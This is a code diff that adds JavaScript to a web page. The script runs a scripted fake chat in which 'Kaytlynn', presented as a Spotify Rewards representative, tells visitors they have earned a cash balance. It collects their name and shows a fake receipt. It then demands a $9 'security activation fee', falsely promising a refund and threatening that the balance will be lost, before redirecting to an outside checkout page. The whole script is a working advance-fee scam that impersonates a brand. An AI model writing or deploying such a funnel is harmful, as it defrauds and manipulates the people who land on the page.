@@ -531,6 +531,225 @@
     })();
   </script>
 
+  <script>
+    (function () {
+      var body = document.getElementById('chatBody');
+      var input = document.getElementById('chatInput');
+      var AV = 'avatar.png';
+      var vars = { nome: '', balance: parseFloat(balanceVal).toFixed(2) };
+
+      var CHECKOUT = 'https://pay.app-pagar.shop/KV603kYYWEkGw8y';
+
+      function fill(t) {
+        return t.replace(/\{\{(\w+)\}\}/g, function (_, k) { return vars[k] || ''; });
+      }
+      function scroll() { body.scrollTop = body.scrollHeight; }
+      function sleep(ms) { return new Promise(function (r) { setTimeout(r, ms); }); }
+
+      function botRow(inner, cls) {
+        var row = document.createElement('div');
+        row.className = 'row bot';
+        var img = document.createElement('img');
+        img.className = 'av'; img.src = AV; img.alt = 'Kaytlynn W.';
+        var b = document.createElement('div');
+        b.className = 'bubble' + (cls ? ' ' + cls : '');
+        if (typeof inner === 'string') { b.textContent = inner; } else { b.appendChild(inner); }
+        row.appendChild(img); row.appendChild(b);
+        body.appendChild(row); scroll();
+        return row;
+      }
+
+      function userRow(text) {
+        var row = document.createElement('div');
+        row.className = 'row user';
+        var b = document.createElement('div');
+        b.className = 'bubble';
+        b.textContent = text;
+        row.appendChild(b);
+        body.appendChild(row); scroll();
+      }
+
+      async function typing(ms) {
+        var el = document.createElement('span');
+        el.className = 'typing';
+        el.innerHTML = '<i></i><i></i><i></i>';
+        var row = botRow(el);
+        await sleep(ms);
+        row.remove();
+      }
+
+      async function say(text) {
+        text = fill(text);
+        await typing(Math.min(1600, 500 + text.length * 12));
+        botRow(text);
+      }
+
+      function media(url, height) {
+        var f = document.createElement('iframe');
+        f.src = fill(url);
+        f.height = height;
+        f.setAttribute('frameborder', '0');
+        f.setAttribute('allow', 'autoplay; fullscreen; encrypted-media');
+        f.setAttribute('allowfullscreen', '');
+        f.style.height = height + 'px';
+        botRow(f, 'media');
+        return f;
+      }
+
+      function clearInput() { input.innerHTML = ''; }
+
+      function askButton(label) {
+        return new Promise(function (resolve) {
+          clearInput();
+          var b = document.createElement('button');
+          b.className = 'cta';
+          b.textContent = label;
+          b.onclick = function () {
+            clearInput();
+            userRow(label);
+            resolve(label);
+          };
+          input.appendChild(b);
+          scroll();
+        });
+      }
+
+      function askText(placeholder) {
+        return new Promise(function (resolve) {
+          clearInput();
+          var wrap = document.createElement('form');
+          wrap.className = 'field';
+          var i = document.createElement('input');
+          i.type = 'text'; i.placeholder = placeholder; i.autocomplete = 'name';
+          var s = document.createElement('button');
+          s.type = 'submit'; s.innerHTML = '&#10148;';
+          wrap.appendChild(i); wrap.appendChild(s);
+          wrap.onsubmit = function (e) {
+            e.preventDefault();
+            var v = i.value.trim();
+            if (!v) return;
+            clearInput();
+            userRow(v);
+            resolve(v);
+          };
+          input.appendChild(wrap);
+          scroll();
+          setTimeout(function () { i.focus(); }, 200);
+        });
+      }
+
+      function waitForSongs(timeoutMs) {
+        return new Promise(function (resolve) {
+          var done = false;
+          function finish() {
+            if (done) return;
+            done = true;
+            window.removeEventListener('message', onMsg);
+            resolve();
+          }
+          function onMsg(e) {
+            var d = e.data;
+            var s = typeof d === 'string' ? d : (d && (d.name || d.event || d.type)) || '';
+            if (String(s).indexOf('finalizar_musicas') !== -1 || String(s).indexOf('finish') !== -1) finish();
+          }
+          window.addEventListener('message', onMsg);
+          setTimeout(finish, timeoutMs);
+        });
+      }
+
+      function step(name) {
+        var trk = window.trkFunnel;
+        if (trk && typeof trk.step === 'function') { try { trk.step(name); } catch (e) {} }
+      }
+
+      async function run() {
+        // Etapa 01
+        await say('To begin your service, your case number is 809821');
+        await sleep(4000);
+        await say("You've been one of the few people selected for the Spotify Rewards Program");
+        await sleep(3000);
+        await say("We've selected four songs for you to listen to and rate. Get started right here below. 👇");
+        media('https://roaring-lolly-11eb43.netlify.app/', 520);
+        await waitForSongs(600000);
+        await sleep(3000);
+        await say('Click the button below to continue with your registration.');
+        await sleep(3000);
+        await say('(Click the button below to continue with your withdrawal)');
+
+        // Etapa 02
+        await askButton('Start Verification');
+        step('iniciouspt');
+        await sleep(2000);
+        await say('✅ Kaytlynn, the Spotify Rewards representative, has joined the chat');
+        await sleep(4000);
+        await say('👋 Hi, welcome to the Spotify Rewards!');
+        await sleep(3000);
+        media('https://scripts.converteai.net/0e182029-b550-49e8-926e-fc1e64feeeff/players/6a7b485e038aa468306b3184/v4/embed.html', 580);
+        await sleep(27000);
+        await say('You have a balance of ${{balance}} in our app');
+        await sleep(3000);
+        await say('Would you like to continue so you can withdraw your money?');
+        await say('(Click the button below to continue)');
+        await askButton('Yes, I would like to withdraw');
+
+        // Etapa 03
+        await say("Would you like to receive your reward for the work you've done?");
+        await say('(Click the button below to continue)');
+        await askButton('Yes, I do!');
+
+        // Etapa 04 - name
+        await say("✅ Okay, I'll continue with your registration.");
+        await sleep(3000);
+        await say("At this stage, I need you to tell me your name so I can verify that you're a new user.");
+        await sleep(3000);
+        await say('What is your full name? 👇🏻');
+        await say('(Write below)');
+        vars.nome = await askText('Enter your name here...');
+        await say('⌛ Checking...');
+        await sleep(6000);
+
+        // Etapa 05
+        await say('⌛ Just a moment...');
+        await sleep(10000);
+        await say('Everything looks good, {{nome}}!\n\nI checked our system and saw that you are eligible to receive your commission of ${{balance}}');
+
+        // Etapa 06
+        await sleep(3000);
+        await say('I\u2019m sending you the receipt for your commissions 👇🏻');
+        await sleep(1000);
+        await say('⌛ Loading...');
+        await sleep(4000);
+        await say('⌛ Generating your commission withdrawal receipt...');
+        await sleep(4000);
+        media('https://relaxed-druid-643d49.netlify.app/?nome=' + encodeURIComponent(vars.nome) + '&email=', 510);
+        await sleep(4000);
+
+        // Etapa 07
+        await say('(Click the button below to continue)');
+        await askButton('I want to claim my reward');
+        step('vslspt');
+
+        // VSL + oferta
+        await say('🚨 Your access to withdraw your commission will be granted after this short explanatory video');
+        media('https://scripts.converteai.net/9178dec5-4376-4fb6-a5a8-35d56d5f6870/players/6a725964cde4548269a9b559/embed.html', 240);
+        await sleep(260000);
+        await say('🤑 🎁 Your balance of ${{balance}} is ready!\n\nTo withdraw your earnings today, all you need to do is pay a small security activation fee of $9.00\n\nThis is to verify your account and ensure that you are not a bot.');
+        await sleep(5000);
+        await say('🚨 Please note: The fee will be fully refunded after registration, along with your current balance of ${{balance}}');
+        await sleep(4000);
+        await say('This is a unique opportunity.\n\nIf you decide to leave now, your balance will be canceled and transferred to another user on the waiting list.');
+        await sleep(3000);
+        await say("We'll redirect you to the payment page—please don't leave the payment page.");
+        await sleep(4000);
+        step('checkoutspt');
+        window.location.href = CHECKOUT;
+      }
+
+      run();
+    })();
+  </script>
+
+
 </body>
 
 </html>
